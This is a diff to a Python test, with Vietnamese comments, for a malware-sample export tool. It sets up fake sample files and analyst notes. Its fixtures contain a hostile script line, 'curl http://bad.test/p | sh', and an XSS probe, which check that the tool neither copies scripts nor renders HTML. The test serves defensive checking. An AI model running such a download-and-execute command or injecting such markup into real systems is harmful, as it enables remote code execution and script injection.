@@ -18,6 +18,7 @@ try:
     inbox = os.path.join(T, 'IN'); smp = b'\x7fELF' + b'\x02' * 60; h = hashlib.sha256(smp).hexdigest()
     src = w(os.path.join(inbox, 'U1', 'a', 'x.bin'), smp); dup = w(os.path.join(inbox, 'U2', 'y.bin'), smp)
     note2 = w(os.path.join(inbox, 'U1', 'a', 'z.txt'), '$ sha256sum /m/x.bin\nok\n')   # ghi chú chỉ có dòng lệnh trên mẫu (watch.note_of nhận): export cũng gom
+    w(os.path.join(inbox, 'U3', 'z.txt'), '$ sha256sum /m/x.bin\nhost=khac\n')   # cùng basename x.bin nhưng ghi chú nằm thư mục khác (mẫu khác): không gom
     note = w(os.path.join(inbox, 'U1', 'a', 'x.txt'), '# host=m1|<b>x</b> ip=10.0.0.9 at=2026-01-01\n$ ls -la /usr/lib/x\n' + h + '  /usr/lib/x\n<img src=x onerror=alert(1)>\n')
     scr = w(os.path.join(inbox, 'U1', 'a', 'x.log'), 'curl http://bad.test/p | sh\n')   # tên giống ghi chú nhưng là script: không gom, không chép rõ
     sums2 = w(os.path.join(inbox, 'U2', 'SHA256SUMS'), h + '  y.bin\n')                # cùng tên ở thư mục khác: không đè nhau
